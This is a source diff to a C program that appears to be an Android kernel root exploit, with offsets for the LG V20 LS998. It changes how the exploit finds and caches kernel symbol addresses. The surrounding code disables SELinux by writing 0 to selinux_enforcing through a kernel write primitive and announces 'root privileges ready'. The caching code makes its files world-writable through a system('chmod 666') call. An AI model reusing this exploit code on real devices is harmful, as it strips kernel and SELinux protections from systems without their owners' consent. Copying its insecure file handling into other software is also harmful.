@@ -21,7 +21,7 @@
 #define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)
 
 #undef NO_PROC_KALLSYMS
-#undef KALLSYMS_CACHING
+#define KALLSYMS_CACHING
 #define KSYM_NAME_LEN 128
 
 //Not needed, but saved for future use; the offsets are for LGV20 LS998
@@ -814,6 +814,8 @@ unsigned long findSymbol_memory_search(char* symbol) {
     for(unsigned long i = 0; i < kallsyms.num_syms; i++) {
         unsigned int n = get_kallsym_name(offset, name);
         if (!strcmp(name+1, symbol)) {
+            message( "found symbol in kernel memory", symbol);
+            
             return kernel_read_ulong(kallsyms.addresses + i*8);
         }
         offset += n;
@@ -822,10 +824,72 @@ unsigned long findSymbol_memory_search(char* symbol) {
     return 0;
 }
 
+char* allocateSymbolCachePathName(char* execName, char* symbol) {
+    char* p = strrchr(execName, '/');
+    unsigned n;
+    if (p == NULL)
+        n = 0;
+    else
+        n = p-execName+1;
+
+    char* pathname = malloc(strlen(symbol)+7+1+n);
+    if (pathname == NULL) {
+        errno = 0;
+        error("allocating memory for pathname");
+    }
+    strncpy(pathname, execName, n);
+    pathname[n] = 0;
+    strcat(pathname, symbol);
+    strcat(pathname, ".symbol");
+
+    return pathname;
+}
+
+unsigned long findSymbol_in_cache(char* execName, char* symbol) {
+    char* pathname = allocateSymbolCachePathName(execName, symbol);
+    unsigned long address = 0;
+    
+    FILE *cached = fopen(pathname, "r");
+    if (cached != NULL) {
+        fscanf(cached, "%lx", &address);
+        fclose(cached);
+    }
+    
+    free(pathname);
+    
+    return address;
+}
+
+void cacheSymbol(char* execName, char* symbol, unsigned long address) {
+#ifdef KALLSYMS_CACHING
+    if (address != 0) {
+        char* pathname = allocateSymbolCachePathName(execName, symbol);
+        FILE *cached = fopen(pathname, "w");
+        if (cached != NULL) {
+            fprintf(cached, "%lx\n", address);
+            fclose(cached);
+            char* cmd = alloca(10+strlen(pathname)+1);
+            sprintf(cmd, "chmod 666 %s", pathname);
+            system(cmd);
+            message("cached %s", pathname);
+        }
+        free(pathname);
+    }
+#endif
+}
+    
 unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char *symbol)
 {
+    unsigned long address = 0;
+    
+#ifdef KALLSYMS_CACHING    
+    address = findSymbol_in_cache(execName, symbol);
+    if (address != 0)
+        return address;
+#endif
+    
 #ifdef NO_PROC_KALLSYMS
-    return findSymbol_memory_search(symbol);
+    address = findSymbol_memory_search(symbol);
 #else    
     char buf[1024];
     buf[0] = 0;
@@ -839,69 +903,31 @@ unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char
     if (ks != NULL)
         fclose(ks);
     
-    char* p = strrchr(execName, '/');
-    unsigned n;
-    if (p == NULL)
-        n = 0;
-    else
-        n = p-execName+1;
-    
-#ifdef KALLSYMS_CACHING    
-    char* pathname = alloca(strlen(symbol)+7+1+n);
-    strncpy(pathname, execName, n);
-    pathname[n] = 0;
-    strcat(pathname, symbol);
-    strcat(pathname, ".symbol");
-#endif    
-    
-    if (buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) {
-        unsigned long address = 0;
-#ifdef KALLSYMS_CACHING        
-        FILE *cached = fopen(pathname, "r");
-        if (cached != NULL) {
-            fscanf(cached, "%lx", &address);
-            fclose(cached);
-        }
-        if (address != 0) {
-            message("MAIN: read address %lx from cache", address);
-            return address;
-        }
-#endif
-        if (fixKallsymsFormatStrings(pointInKernelMemory) == 0)
-        {
-            message( "MAIN: **partial failure** cannnot fix kallsyms format string");
-            return findSymbol_memory_search(symbol);
-        }
-    }
-
-    ks = fopen("/proc/kallsyms", "r");
-    while (NULL != fgets(buf, sizeof(buf), ks)) 
+    if ( (buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) && fixKallsymsFormatStrings(pointInKernelMemory) == 0)
     {
-        unsigned long address;
-        unsigned char type;
-        char sym[1024];
-        sscanf(buf, "%lx %c %s", &address, &type, sym);
-        if (!strcmp(sym, symbol)) // && p[l] == '\x0A')
-        {
-            fclose(ks);
-
-#ifdef KALLSYMS_CACHING    
-            FILE *cached = fopen(pathname, "w");
-            if (cached != NULL) {
-                fprintf(cached, "%lx\n", address);
-                fclose(cached);
-                char* cmd = alloca(10+strlen(pathname)+1);
-                sprintf(cmd, "chmod 666 %s", pathname);
-                system(cmd);
-            }
-#endif
-            return address;
-        }
+        message( "MAIN: **partial failure** cannnot fix kallsyms format string");
+        address = findSymbol_memory_search(symbol);
     }
+    else {
+        ks = fopen("/proc/kallsyms", "r");
+        while (NULL != fgets(buf, sizeof(buf), ks)) 
+        {
+            unsigned long a;
+            unsigned char type;
+            char sym[1024];
+            sscanf(buf, "%lx %c %s", &a, &type, sym);
+            if (!strcmp(sym, symbol)) {
+                message( "found %s in /proc/kallsyms", sym);
+                address = a;
+                break;
+            }
+        }
 
-    fclose(ks);
-    return 0;
-#endif    
+        fclose(ks);
+    }
+#endif
+
+    return address;
 }
 
 int main(int argc, char **argv)
@@ -1005,11 +1031,14 @@ int main(int argc, char **argv)
 
 
     if (selinux_enforcing == 0)
-        message("MAIN: **FAIL** cannot find selinux_enforcing symbol");
+        message("MAIN: **FAIL** did not find selinux_enforcing symbol");
     else
     {
         kernel_write_uint(selinux_enforcing, 0);
         message("MAIN: disabled selinux enforcing");
+        
+    cacheSymbol(argv[0], "selinux_enforcing", selinux_enforcing);
+    message("MAIN: root privileges ready");
         
 /* process hangs if these are done */        
 //        unsigned long security_ptr = kernel_read_ulong(cred_ptr + OFFSET__cred__security);
